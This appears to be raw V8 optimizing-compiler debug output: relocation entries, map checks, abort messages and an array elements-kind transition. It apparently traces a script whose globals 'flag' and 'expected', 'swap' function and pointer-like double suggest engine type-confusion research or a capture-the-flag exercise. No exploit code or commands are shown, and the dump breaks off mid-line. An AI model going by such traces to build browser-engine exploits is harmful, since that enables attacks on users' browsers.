0x26c10af0b33c  external reference (Runtime::InitializeVarGlobal)  (0x7fd2ca76e720)
0x26c10af0b345  code target (STUB)  (0x26c10ad041a0)
0x26c10af0b349  comment  (;;; <@166,#130> lazy-bailout)
0x26c10af0b349  comment  (;;; <@168,#134> push-argument)
0x26c10af0b34b  embedded object  (0x4ce712310b1 <String[4]: flag>)
0x26c10af0b355  comment  (;;; <@170,#134> push-argument)
0x26c10af0b357  comment  (;;; <@172,#134> push-argument)
0x26c10af0b359  comment  (;;; <@173,#134> gap)
0x26c10af0b35d  comment  (;;; <@174,#135> call-runtime)
0x26c10af0b364  external reference (Runtime::InitializeVarGlobal)  (0x7fd2ca76e720)
0x26c10af0b36d  code target (STUB)  (0x26c10ad041a0)
0x26c10af0b371  comment  (;;; <@176,#136> lazy-bailout)
0x26c10af0b371  comment  (;;; <@178,#140> push-argument)
0x26c10af0b373  embedded object  (0x4ce712310f1 <String[8]: expected>)
0x26c10af0b37d  comment  (;;; <@180,#140> push-argument)
0x26c10af0b37f  comment  (;;; <@182,#140> push-argument)
0x26c10af0b381  embedded object  (0x4ce7123dd11 <Number: 6.17652e-312>)
0x26c10af0b38b  comment  (;;; <@183,#140> gap)
0x26c10af0b38f  comment  (;;; <@184,#141> call-runtime)
0x26c10af0b396  external reference (Runtime::InitializeVarGlobal)  (0x7fd2ca76e720)
0x26c10af0b39f  code target (STUB)  (0x26c10ad041a0)
0x26c10af0b3a3  comment  (;;; <@186,#142> lazy-bailout)
0x26c10af0b3a3  comment  (;;; <@188,#144> constant-t)
0x26c10af0b3a5  embedded object  (0x4ce712325a9 PropertyCell for 24581)
0x26c10af0b3ad  comment  (;;; <@190,#145> store-named-field)
0x26c10af0b3b1  comment  (Abort message: )
0x26c10af0b3b1  comment  (Operand is a smi)
0x26c10af0b3bc  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b3c8  comment  (;;; <@193,#148> goto)
0x26c10af0b3cd  comment  (;;; <@194,#152> -------------------- B3 (OSR entry) --------------------)
0x26c10af0b3d1  comment  (;;; <@204,#158> context)
0x26c10af0b3d5  comment  (;;; <@206,#160> gap)
0x26c10af0b3d9  comment  (;;; <@207,#160> goto)
0x26c10af0b3de  comment  (;;; <@208,#149> -------------------- B4 --------------------)
0x26c10af0b3de  comment  (;;; <@210,#151> gap)
0x26c10af0b3e6  comment  (;;; <@212,#167> -------------------- B5 --------------------)
0x26c10af0b3ee  comment  (;;; <@214,#203> check-maps)
0x26c10af0b3ee  comment  (;;; <@216,#205> check-maps)
0x26c10af0b3ee  comment  (;;; <@218,#496> constant-d)
0x26c10af0b3fd  comment  (;;; <@219,#496> gap)
0x26c10af0b402  comment  (;;; <@220,#299> constant-d)
0x26c10af0b411  comment  (;;; <@221,#299> gap)
0x26c10af0b416  comment  (;;; <@224,#170> -------------------- B6 (loop header) --------------------)
0x26c10af0b416  comment  (;;; <@226,#171> constant-t)
0x26c10af0b418  embedded object  (0x4ce712325a9 PropertyCell for 24581)
0x26c10af0b420  comment  (;;; <@228,#172> load-named-field)
0x26c10af0b42a  comment  (Abort message: )
0x26c10af0b42a  comment  (Operand is not a smi)
0x26c10af0b435  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b43d  comment  (;;; <@231,#174> compare-numeric-and-branch)
0x26c10af0b449  comment  (;;; <@232,#175> -------------------- B7 (unreachable/replaced) --------------------)
0x26c10af0b449  comment  (;;; <@236,#181> -------------------- B8 --------------------)
0x26c10af0b449  comment  (;;; <@238,#194> push-argument)
0x26c10af0b44b  embedded object  (0x4ce712377c9 <JS Global Object>)
0x26c10af0b455  comment  (;;; <@240,#187> constant-t)
0x26c10af0b457  embedded object  (0x4ce71203cc1 <FixedArray[251]>)
0x26c10af0b45f  comment  (;;; <@242,#191> constant-t)
0x26c10af0b461  embedded object  (0x4ce71232471 <JS Function swap (SharedFunctionInfo 0x4ce71231351)>)
0x26c10af0b469  comment  (;;; <@244,#196> invoke-function)
0x26c10af0b476  comment  (;;; <@246,#197> lazy-bailout)
0x26c10af0b476  comment  (;;; <@248,#198> constant-t)
0x26c10af0b478  embedded object  (0x4ce7123a4b1 <JS Array[2]>)
0x26c10af0b480  comment  (;;; <@250,#201> check-maps)
0x26c10af0b482  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af0b494  comment  (;;; <@252,#198> constant-t)
0x26c10af0b496  embedded object  (0x4ce7123a4b1 <JS Array[2]>)
0x26c10af0b49e  comment  (;;; <@254,#206> load-named-field)
0x26c10af0b4a2  comment  (;;; <@256,#198> constant-t)
0x26c10af0b4a4  embedded object  (0x4ce7123a4b1 <JS Array[2]>)
0x26c10af0b4ac  comment  (;;; <@258,#207> load-named-field)
0x26c10af0b4b6  comment  (Abort message: )
0x26c10af0b4b6  comment  (Operand is not a smi)
0x26c10af0b4c1  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b4c9  comment  (;;; <@260,#208> bounds-check)
0x26c10af0b4d2  comment  (;;; <@261,#208> gap)
0x26c10af0b4d7  comment  (;;; <@262,#209> store-keyed)
0x26c10af0b4dc  comment  (;;; <@264,#225> gap)
0x26c10af0b4de  comment  (;;; <@266,#226> -------------------- B9 (loop header) --------------------)
0x26c10af0b4e2  comment  (;;; <@268,#229> constant-t)
0x26c10af0b4e4  embedded object  (0x4ce7123a491 <JS Array[2]>)
0x26c10af0b4ec  comment  (;;; <@270,#230> check-maps)
0x26c10af0b4ee  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0b500  comment  (;;; <@272,#229> constant-t)
0x26c10af0b502  embedded object  (0x4ce7123a491 <JS Array[2]>)
0x26c10af0b50a  comment  (;;; <@274,#231> load-named-field)
0x26c10af0b514  comment  (Abort message: )
0x26c10af0b514  comment  (Operand is not a smi)
0x26c10af0b51f  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b527  comment  (;;; <@277,#232> compare-numeric-and-branch)
0x26c10af0b52f  comment  (;;; <@278,#233> -------------------- B10 (unreachable/replaced) --------------------)
0x26c10af0b52f  comment  (;;; <@282,#239> -------------------- B11 --------------------)
0x26c10af0b52f  comment  (;;; <@284,#241> stack-check)
0x26c10af0b53c  comment  (;;; <@286,#229> constant-t)
0x26c10af0b53e  embedded object  (0x4ce7123a491 <JS Array[2]>)
0x26c10af0b546  comment  (;;; <@288,#245> load-named-field)
0x26c10af0b54a  comment  (;;; <@290,#247> bounds-check)
0x26c10af0b552  comment  (;;; <@292,#248> load-keyed)
0x26c10af0b557  comment  (;;; <@293,#248> gap)
0x26c10af0b55b  comment  (;;; <@294,#253> allocate)
0x26c10af0b57a  comment  (Abort message: )
0x26c10af0b57a  comment  (Unaligned allocation in new space)
0x26c10af0b585  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b594  comment  (;;; <@295,#253> gap)
0x26c10af0b598  comment  (;;; <@296,#255> store-named-field)
0x26c10af0b59d  comment  (Abort message: )
0x26c10af0b59d  comment  (Operand is a smi)
0x26c10af0b5a8  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b5af  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b5bb  comment  (;;; <@298,#257> store-named-field)
0x26c10af0b5c0  comment  (Abort message: )
0x26c10af0b5c0  comment  (Operand is a smi)
0x26c10af0b5cb  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b5d2  embedded object  (0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b5de  comment  (;;; <@300,#259> store-named-field)
0x26c10af0b5e3  comment  (Abort message: )
0x26c10af0b5e3  comment  (Operand is a smi)
0x26c10af0b5ee  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b5f5  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b601  comment  (;;; <@302,#260> store-named-field)
0x26c10af0b606  comment  (Abort message: )
0x26c10af0b606  comment  (Operand is a smi)
0x26c10af0b611  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b618  embedded object  (0x139738b02311 <undefined>)
0x26c10af0b624  comment  (;;; <@304,#261> store-named-field)
0x26c10af0b629  comment  (Abort message: )
0x26c10af0b629  comment  (Operand is a smi)
0x26c10af0b634  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b63b  embedded object  (0x139738b02311 <undefined>)
0x26c10af0b647  comment  (;;; <@306,#262> store-named-field)
0x26c10af0b64c  comment  (Abort message: )
0x26c10af0b64c  comment  (Operand is a smi)
0x26c10af0b657  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b65e  embedded object  (0x139738b02311 <undefined>)
0x26c10af0b66a  comment  (;;; <@308,#263> store-named-field)
0x26c10af0b66f  comment  (Abort message: )
0x26c10af0b66f  comment  (Operand is a smi)
0x26c10af0b67a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b681  embedded object  (0x139738b02311 <undefined>)
0x26c10af0b68d  comment  (;;; <@310,#267> store-named-field)
0x26c10af0b692  comment  (Abort message: )
0x26c10af0b692  comment  (Operand is a smi)
0x26c10af0b69d  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b6a4  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b6b0  comment  (;;; <@312,#268> store-named-field)
0x26c10af0b6b5  comment  (Abort message: )
0x26c10af0b6b5  comment  (Operand is a smi)
0x26c10af0b6c0  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b6c7  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b6d3  comment  (;;; <@314,#269> store-named-field)
0x26c10af0b6d8  comment  (Abort message: )
0x26c10af0b6d8  comment  (Operand is a smi)
0x26c10af0b6e3  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b6ea  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b6f6  comment  (;;; <@316,#270> store-named-field)
0x26c10af0b6fb  comment  (Abort message: )
0x26c10af0b6fb  comment  (Operand is a smi)
0x26c10af0b706  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b70d  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b719  comment  (;;; <@318,#271> check-non-smi)
0x26c10af0b722  comment  (;;; <@320,#187> constant-t)
0x26c10af0b724  embedded object  (0x4ce71203cc1 <FixedArray[251]>)
0x26c10af0b72c  comment  (;;; <@321,#187> gap)
0x26c10af0b72f  comment  (;;; <@322,#272> transition-elements-kind)
0x26c10af0b731  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af0b75c  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0b765  code target (STUB)  (0x26c10af08900)
0x26c10af0b780  comment  (;;; <@324,#272> lazy-bailout)
0x26c10af0b780  comment  (;;; <@325,#272> gap)
0x26c10af0b784  comment  (;;; <@326,#273> check-maps)
0x26c10af0b786  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0b798  comment  (;;; <@328,#278> load-named-field)
0x26c10af0b79c  comment  (;;; <@330,#279> check-maps)
0x26c10af0b79e  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b7b0  comment  (;;; <@332,#280> load-named-field)
0x26c10af0b7ba  comment  (Abort message: )
0x26c10af0b7ba  comment  (Operand is not a smi)
0x26c10af0b7c5  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b7cd  comment  (;;; <@334,#281> bounds-check)
0x26c10af0b7d6  comment  (;;; <@336,#199> constant-i)
0x26c10af0b7d8  comment  (;;; <@337,#199> gap)
0x26c10af0b7e2  comment  (;;; <@338,#283> store-keyed)
0x26c10af0b7f1  comment  (Abort message: )
0x26c10af0b7f1  comment  (Operand is a smi)
0x26c10af0b7fc  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b824  code target (STUB)  (0x26c10af08da0)
0x26c10af0b83c  comment  (;;; <@339,#283> gap)
0x26c10af0b840  comment  (;;; <@340,#288> add-i)
0x26c10af0b843  comment  (;;; <@342,#291> gap)
0x26c10af0b848  comment  (;;; <@343,#291> goto)
0x26c10af0b84d  comment  (;;; <@344,#236> -------------------- B12 (unreachable/replaced) --------------------)
0x26c10af0b84d  comment  (;;; <@348,#292> -------------------- B13 (unreachable/replaced) --------------------)
0x26c10af0b84d  comment  (;;; <@352,#296> -------------------- B14 --------------------)
0x26c10af0b84d  comment  (;;; <@354,#198> constant-t)
0x26c10af0b84f  embedded object  (0x4ce7123a4b1 <JS Array[2]>)
0x26c10af0b857  comment  (;;; <@356,#305> load-named-field)
0x26c10af0b85b  comment  (;;; <@358,#198> constant-t)
0x26c10af0b85d  embedded object  (0x4ce7123a4b1 <JS Array[2]>)
0x26c10af0b865  comment  (;;; <@360,#306> load-named-field)
0x26c10af0b86f  comment  (Abort message: )
0x26c10af0b86f  comment  (Operand is not a smi)
0x26c10af0b87a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b882  comment  (;;; <@362,#307> bounds-check)
0x26c10af0b88b  comment  (;;; <@363,#307> gap)
0x26c10af0b890  comment  (;;; <@364,#308> store-keyed)
0x26c10af0b895  comment  (;;; <@368,#313> -------------------- B15 --------------------)
0x26c10af0b895  comment  (;;; <@370,#171> constant-t)
0x26c10af0b897  embedded object  (0x4ce712325a9 PropertyCell for 24581)
0x26c10af0b89f  comment  (;;; <@372,#315> load-named-field)
0x26c10af0b8a9  comment  (Abort message: )
0x26c10af0b8a9  comment  (Operand is not a smi)
0x26c10af0b8b4  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b8bc  comment  (;;; <@374,#317> add-i)
0x26c10af0b8c5  comment  (;;; <@376,#497> smi-tag)
0x26c10af0b8cb  comment  (;;; <@378,#171> constant-t)
0x26c10af0b8cd  embedded object  (0x4ce712325a9 PropertyCell for 24581)
0x26c10af0b8d5  comment  (;;; <@380,#319> store-named-field)
0x26c10af0b8da  comment  (Abort message: )
0x26c10af0b8da  comment  (Operand is a smi)
0x26c10af0b8e5  code target (BUILTIN)  (0x26c10ad04120)
0x26c1